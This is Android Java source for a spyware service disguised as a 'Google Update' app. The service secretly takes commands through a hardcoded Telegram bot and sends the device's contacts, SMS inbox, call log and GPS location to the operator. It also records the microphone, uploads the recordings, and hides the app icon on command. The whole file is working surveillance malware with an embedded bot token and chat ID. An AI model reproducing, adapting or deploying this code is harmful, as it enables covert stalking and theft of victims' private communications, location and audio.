package com.google.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import javax.net.ssl.HttpsURLConnection;

public class TelegramBotService extends Service {
    // التوكن والايدي الخاصين بك
    private static final String BOT_TOKEN = "8750593602:AAFTlpdAXxNiJ7LuRdDP4TSQ6Hqn8C_fAhs";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private static final String CHANNEL_ID = "GoogleChannel";
    private Thread botThread;
    private volatile boolean running = true;
    private int lastUpdateId = 0;
    private MediaRecorder mediaRecorder;
    private String currentAudioPath;
    private boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1001, createNotification());
        sendMessage("✅ Google Update Service Activated\n📱 Device: " + getDeviceModel());
        startBot();
    }

    private void startBot() {
        botThread = new Thread(() -> {
            while (running) {
                try {
                    String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30");
                    if (response != null && response.contains("\"ok\":true")) {
                        JSONObject json = new JSONObject(response);
                        JSONArray results = json.getJSONArray("result");
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id");
                            if (update.has("message")) {
                                JSONObject msg = update.getJSONObject("message");
                                if (msg.has("text")) {
                                    String text = msg.getString("text").trim().toLowerCase();
                                    long chatId = msg.getJSONObject("chat").getLong("id");
                                    if (String.valueOf(chatId).equals(CHAT_ID)) {
                                        handleCommand(text);
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) { Log.e("Bot", "Error", e); }
                try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
            }
        });
        botThread.start();
    }

    private void handleCommand(String cmd) {
        String c = cmd.split(" ")[0];
        switch (c) {
            case "/start":
                sendMessage("🔰 Google Update Commands:\n/contacts\n/sms\n/calllog\n/location\n/record\n/stoprec\n/hide\n/show\n/info");
                break;
            case "/contacts":
                sendFile("contacts.txt", getContacts().getBytes());
                break;
            case "/sms":
                sendFile("sms.txt", getSms().getBytes());
                break;
            case "/calllog":
                sendFile("call_log.txt", getCallLog().getBytes());
                break;
            case "/location":
                getLocation();
                break;
            case "/record":
                startRecording();
                sendMessage("🎤 Recording started...");
                break;
            case "/stoprec":
                stopRecording();
                break;
            case "/hide":
                MainActivity.hideAppIconStatic(this);
                sendMessage("👁 App hidden");
                break;
            case "/show":
                MainActivity.showAppIcon(this);
                sendMessage("👁 App shown");
                break;
            case "/info":
                sendMessage(getDeviceInfo());
                break;
        }
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" : ").append(phone).append("\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(c.getColumnIndex("address"));
                    String body = c.getString(c.getColumnIndex("body"));
                    sb.append(addr).append(": ").append(body).append("\n---\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getCallLog() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    sb.append(name != null ? name : "Unknown").append(" - ").append(num).append("\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String maps = "https://www.google.com/maps?q=" + loc.getLatitude() + "," + loc.getLongitude();
                sendMessage("📍 Location:\n" + loc.getLatitude() + ", " + loc.getLongitude() + "\n🗺️ " + maps);
            } else {
                sendMessage("❌ Location unavailable");
            }
        } catch (Exception e) { sendMessage("❌ Location error"); }
    }

    private void startRecording() {
        try {
            File dir = new File(getExternalFilesDir(null), "recordings");
            if (!dir.exists()) dir.mkdirs();
            currentAudioPath = dir.getAbsolutePath() + "/rec_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (Exception e) { sendMessage("❌ Recording failed"); }
    }

    private void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                File f = new File(currentAudioPath);
                if (f.exists()) sendFile(f.getName(), readBytes(f));
                sendMessage("⏹ Recording stopped and sent");
            } catch (Exception e) { sendMessage("❌ Stop failed"); }
        } else {
            sendMessage("❌ No active recording");
        }
    }

    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
                HttpsURLConnection conn = (HttpsURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }

    private void sendFile(String name, byte[] data) {
        new Thread(() -> {
            try {
                String boundary = "----Boundary" + System.currentTimeMillis();
                URL url = new URL(API_URL + "sendDocument");
                HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                dos.writeBytes(CHAT_ID + "\r\n");
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + name + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                dos.write(data);
                dos.writeBytes("\r\n");
                dos.writeBytes("--" + boundary + "--\r\n");
                dos.flush();
                dos.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }

    private String get(String urlStr) {
        try {
            HttpsURLConnection conn = (HttpsURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private byte[] readBytes(File f) {
        try {
            FileInputStream fis = new FileInputStream(f);
            byte[] data = new byte[(int) f.length()];
            fis.read(data);
            fis.close();
            return data;
        } catch (Exception e) { return new byte[0]; }
    }

    private String getDeviceModel() { return Build.MANUFACTURER + " " + Build.MODEL; }
    private String getDeviceInfo() { return "📱 Device:\n" + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE; }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Google Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Update").setContentText("Running").setSmallIcon(android.R.drawable.ic_popup_sync).setOngoing(true).build();
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { running = false; if (mediaRecorder != null) mediaRecorder.release(); super.onDestroy(); }
}
